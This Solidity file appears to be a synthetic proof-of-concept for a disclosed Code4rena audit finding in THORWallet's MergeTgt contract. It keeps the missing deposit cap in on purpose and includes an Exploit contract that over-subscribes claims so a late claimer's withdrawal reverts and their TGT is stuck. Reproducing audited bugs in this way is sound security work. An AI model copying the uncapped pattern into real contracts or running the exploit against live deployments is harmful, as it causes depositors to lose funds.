// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    THORWallet — [H-1] MergeTgt has no handling if TGT_TO_EXCHANGE is
    exceeded during the exchange period
    (Striking_Lions, Code4rena 2025-02-thorwallet, finding #55396)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: MergeTgt hardcodes TGT_TO_EXCHANGE and TITN_ARB and uses
    their ratio for claim quotes, but onTokenTransfer never enforces a
    deposit cap. Once total deposited TGT exceeds TGT_TO_EXCHANGE, the sum
    of claimable TITN exceeds the TITN actually deposited, so late claimers
    revert for insufficient balance — permanent loss of their claim / TGT.

    Vulnerable onTokenTransfer accrual + claimTitn transfer are preserved.
    Constants kept at real values (scaled down only for the deposit amounts
    relative to the cap in the attack, not the constants themselves).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Reduced MergeTgt: deposit TITN, accept TGT via onTokenTransfer,
///         quote and claim — with NO cap on total TGT deposited.
contract MergeTgt {
    MockERC20 public immutable tgt;
    MockERC20 public immutable titn;

    uint256 public constant TGT_TO_EXCHANGE = 579_000_000 * 10 ** 18;
    uint256 public constant TITN_ARB = 173_700_000 * 10 ** 18;

    uint256 public launchTime;
    mapping(address => uint256) public claimableTitnPerUser;
    uint256 public totalTitnClaimable;
    uint256 public totalTitnClaimed;

    constructor(address _tgt, address _titn) {
        tgt = MockERC20(_tgt);
        titn = MockERC20(_titn);
        launchTime = block.timestamp; // unlocked at deploy (no cheatcodes for setLaunchTime)
    }

    function depositTitn(uint256 amount) external {
        // owner deposits the full TITN_ARB reserve for claims
        titn.transferFrom(msg.sender, address(this), amount);
    }

    /// @notice ERC677-like transferAndCall entry: pull TGT then accrue claimable TITN.
    ///         Stands in for tgt.transferAndCall → onTokenTransfer(from, amount).
    function depositTgt(address from, uint256 amount) external {
        require(amount > 0, "ZeroAmount");
        // Pull TGT from the depositor (transferAndCall equivalent).
        tgt.transferFrom(from, address(this), amount);
        _onTokenTransfer(from, amount);
    }

    /// @notice tgt transferAndCall / onTokenTransfer path (verbatim accrual).
    function _onTokenTransfer(address from, uint256 amount) internal {
        // FIX: require(tgt.balanceOf(address(this)) + amount <= TGT_TO_EXCHANGE)
        uint256 titnOut = quoteTitn(amount); // @> VULN: no deposit cap vs TGT_TO_EXCHANGE
        claimableTitnPerUser[from] += titnOut;
        totalTitnClaimable += titnOut;
    }

    function quoteTitn(uint256 tgtAmount) public view returns (uint256 titnAmount) {
        // Within first 90 days: linear ratio (launchTime == now in this synthetic).
        titnAmount = (tgtAmount * TITN_ARB) / TGT_TO_EXCHANGE;
    }

    function claimTitn(uint256 amount) external {
        require(amount <= claimableTitnPerUser[msg.sender], "Not enough claimable titn");
        claimableTitnPerUser[msg.sender] -= amount;
        totalTitnClaimable -= amount;
        totalTitnClaimed += amount;
        // reverts if contract holds insufficient TITN (late claimers after over-deposit)
        titn.transfer(msg.sender, amount);
    }
}

/// @dev Actor that deposits TGT and claims TITN as a distinct user.
contract UserActor {
    MergeTgt public merge;
    MockERC20 public tgt;
    MockERC20 public titn;

    constructor(MergeTgt m, MockERC20 t, MockERC20 n) {
        merge = m;
        tgt = t;
        titn = n;
    }

    function deposit(uint256 amount) external {
        tgt.approve(address(merge), amount);
        merge.depositTgt(address(this), amount);
    }

    function claim(uint256 amount) external {
        merge.claimTitn(amount);
    }
}

/// @notice Two users deposit TGT whose quoted TITN sum exceeds TITN_ARB.
///         First claimer drains the reserve; second claim reverts — permanent loss.
contract Exploit {
    MockERC20 public tgt; // CREATE 1
    MockERC20 public titn; // CREATE 2
    MergeTgt public merge; // CREATE 3
    UserActor public user1; // CREATE 4
    UserActor public user2; // CREATE 5

    // Use amounts that sum just over TGT_TO_EXCHANGE so total claimable > TITN_ARB.
    // user1: 578_999_999e18, user2: 100e18 → total claimable slightly over TITN_ARB.
    uint256 public constant U1_TGT = 578_999_999 * 10 ** 18;
    uint256 public constant U2_TGT = 100 * 10 ** 18;

    constructor() {
        tgt = new MockERC20("TGT", "TGT"); // 1
        titn = new MockERC20("TITN", "TITN"); // 2
        merge = new MergeTgt(address(tgt), address(titn)); // 3
        user1 = new UserActor(merge, tgt, titn); // 4
        user2 = new UserActor(merge, tgt, titn); // 5

        // Admin seeds exactly TITN_ARB for claims.
        titn.mint(address(this), merge.TITN_ARB());
        titn.approve(address(merge), merge.TITN_ARB());
        merge.depositTitn(merge.TITN_ARB());

        // Fund users with TGT.
        tgt.mint(address(user1), U1_TGT);
        tgt.mint(address(user2), U2_TGT);
    }

    function run() external {
        // Both users deposit — no cap prevents exceeding TGT_TO_EXCHANGE.
        user1.deposit(U1_TGT);
        user2.deposit(U2_TGT);

        uint256 claimable1 = merge.claimableTitnPerUser(address(user1));
        uint256 claimable2 = merge.claimableTitnPerUser(address(user2));
        require(claimable1 + claimable2 > merge.TITN_ARB(), "need over-subscribed claimable");
        require(titn.balanceOf(address(merge)) == merge.TITN_ARB(), "reserve wrong");

        // user2 (small) claims successfully first.
        user2.claim(claimable2);
        require(titn.balanceOf(address(user2)) == claimable2, "user2 claim ok");

        // user1's full claim now exceeds remaining TITN → transfer reverts.
        uint256 remaining = titn.balanceOf(address(merge));
        require(claimable1 > remaining, "user1 should be short");

        bool reverted;
        try user1.claim(claimable1) {
            reverted = false;
        } catch {
            reverted = true;
        }
        require(reverted, "harm: late claimer must fail");
        require(titn.balanceOf(address(user1)) == 0, "user1 must not have received TITN");
        // TGT is stuck in MergeTgt; claimable still on the books but unclaimable.
        require(tgt.balanceOf(address(merge)) == U1_TGT + U2_TGT, "TGT stuck in merge");
        require(merge.claimableTitnPerUser(address(user1)) == claimable1, "claimable still booked");
    }
}
